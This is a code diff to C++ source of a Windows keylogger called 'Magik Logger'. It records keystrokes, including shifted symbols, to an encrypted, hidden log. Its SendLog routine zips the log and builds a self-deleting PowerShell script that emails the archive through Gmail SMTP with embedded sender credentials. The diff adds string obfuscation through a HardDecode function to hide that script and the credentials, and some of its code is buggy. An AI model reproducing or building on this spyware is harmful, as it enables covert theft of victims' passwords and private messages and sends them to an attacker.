@@ -44,41 +44,140 @@ void Log::LogItInt(int key_stroke) {
 
     std::cout << key_stroke << std::endl;
 
-    if (key_stroke == 8)
+    switch (key_stroke) {                                                       //fix OEMX keys by checking for shift and keyb layout
+    case VK_BACK:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
-    else if (key_stroke == 13)
+        break;
+    case  13:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
-    else if (key_stroke == VK_SPACE)
+        break;
+    case  32:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
-    else if (key_stroke == VK_LWIN)
+        break;
+    case  VK_LWIN:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
-    else if (key_stroke == VK_TAB)
+        break;
+    case  9:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
-    else if (key_stroke == VK_CAPITAL)
+        break;
+    case  VK_CAPITAL:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
-    else if (key_stroke == VK_SHIFT)
+        break;
+    case -95:
+    case -96:
+    case VK_LSHIFT:
+    case VK_RSHIFT:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
-    else if (key_stroke == VK_CONTROL)
-        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
-    else if (key_stroke == VK_ESCAPE)
+        break;
+    case  VK_CONTROL:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]"));               //later check for clipboard
+        break;
+    case  27:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
-    else if (key_stroke == VK_END)
+        break;
+    case  VK_END:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
-    else if (key_stroke == VK_HOME)
+        break;
+    case  VK_HOME:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
-    else if (key_stroke == VK_DELETE)
+        break;
+    case  VK_INSERT:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[INSERT]"));
+        break;
+    case  46:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
-    else if (key_stroke == VK_LEFT)
+        break;
+    case  37:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
-    else if (key_stroke == VK_UP)
+        break;
+    case  38:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
-    else if (key_stroke == VK_RIGHT)
+        break;
+    case  39:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
-    else if (key_stroke == VK_DOWN)
+    case 40:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
-    else if (key_stroke == 190 || key_stroke == 110)
+        break;
+    case VK_OEM_2:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM2( /? )]"));
+        break;
+    case VK_OEM_3:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM3( ]} )]"));
+        break;
+    case VK_OEM_4:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM4( '\" )]"));
+        break;
+    case VK_OEM_5:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM5]"));
+        break;
+    /*case VK_OEM_6:
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[OEM6( <> )]"));
+        break;*/
+    case 190:
+    case 110:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
-    else {
+        break;
+    default:
+        if ((GetKeyState(VK_SHIFT) & 0x8000 && (GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetKeyState(VK_SHIFT) & 0x8000 && (GetKeyState(VK_CAPITAL) & 0x0001) == 0)) {
+            switch (key_stroke) {
+            case 48:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString(")"));
+                goto fclose;
+            case 49:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("!"));
+                goto fclose;
+            case 50:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("@"));
+                goto fclose;
+            case 51:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("#"));
+                goto fclose;
+            case 52:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("$"));
+                goto fclose;
+            case 53:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("%"));
+                goto fclose;
+            case 54:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("^"));
+                goto fclose;
+            case 55:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("&"));
+                goto fclose;
+            case 56:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("*"));
+                goto fclose;
+            case 57:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("("));
+                goto fclose;
+            case -64:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("~"));
+                goto fclose;
+            case -67:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("_"));
+                goto fclose;
+            case -69:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("+"));
+                goto fclose;
+            case -70:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString(":"));
+                goto fclose;
+            case -34:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("\""));
+                goto fclose;
+            case -68:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("<"));
+                goto fclose;
+            case -66:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString(">"));
+                goto fclose;
+            case -65:
+                fprintf(OUTPUT_FILE,"%s", EncryptMyString("?"));
+                goto fclose;
+            default:
+                key_stroke += 32;
+            }
+        }
         if (CryptLogs) {
             std::string Temp;
             Temp += (char)key_stroke;
@@ -86,7 +185,10 @@ void Log::LogItInt(int key_stroke) {
         }
         else
             fprintf(OUTPUT_FILE, "%s", &key_stroke);
+        break;
+        
     }
+    fclose:
     fclose(OUTPUT_FILE);
 }
 
@@ -99,35 +201,25 @@ void Log::LogItChar(std::string Value) {
     File << EncryptMyString(Value);
     File.close();
 }
-/*
-void Compress(const buffer& in, buffer& out)
-{
-    auto rv = LZ4_compress_default(in.data(), out.data(), in.size(), out.size());
-    if (rv < 1) std::cerr << "Something went wrong!" << std::endl;
-    else out.resize(rv);
-}
 
 void CompressFile(std::string Path) {
     DWORD WrittenBytes;
     char FileBufferer[1000 + CharactersPerLog];
-    buffer FileBuffer[1000 + CharactersPerLog];
+    std::string FileBuffer;
 
 
     std::ifstream InputFile(Path, std::ios::binary);
     while (!InputFile.eof()) {
-        InputFile.read(FileBufferer,sizeof(FileBufferer));
-        strcat(FileBuffer, FileBufferer);
+        std::getline(InputFile, FileBuffer, '\0');
     }
     InputFile.close();
     DeleteFileA(Path.c_str());
-    buffer data(1000, FileBuffer);
-    buffer compressed(FileBuffer.size()), decompressed(data.size());
-    Compress(FileBuffer, Compressed);
+    LZ4_compress_default(FileBuffer.c_str(), FileBufferer, FileBuffer.size(), strlen(FileBufferer));
     HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    WriteFile(LZ4File, Compressed, strlen(Compressed), &WrittenBytes, NULL);
+    WriteFile(LZ4File, FileBufferer, strlen(FileBufferer), &WrittenBytes, NULL);
     CloseHandle(LZ4File);
 }
-*/
+
 void Log::SendLog() {
     SetFileAttributesA(log.c_str(), FILE_ATTRIBUTE_HIDDEN);
     std::string ZipPath = log;
@@ -143,6 +235,7 @@ void Log::SendLog() {
         CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
         CoUninitialize();
     }
+    //CompressFile(ZipPath);
     std::string Command = "/C powershell ";
     char SysDir[MAX_PATH];
     GetSystemDirectoryA(SysDir, MAX_PATH);
@@ -158,14 +251,14 @@ void Log::SendLog() {
     std::string PSStartup = "MagikMailer";
     PSStartup += std::to_string(GetTickCount());
     HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
-    a += SendersEmail;
+    std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
+    a += HardDecode(SendersEmail);
     a += "', '";
-    a += SendersPsw;
+    a += HardDecode(SendersPsw);
     a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-    a += SendersEmail;
+    a += HardDecode(SendersEmail);
     a += "'\n$ReportEmail.To.Add('";
-    a += RecieversEmail;
+    a += HardDecode(RecieversEmail);
     a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
     a += ZipPath.c_str();
     a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
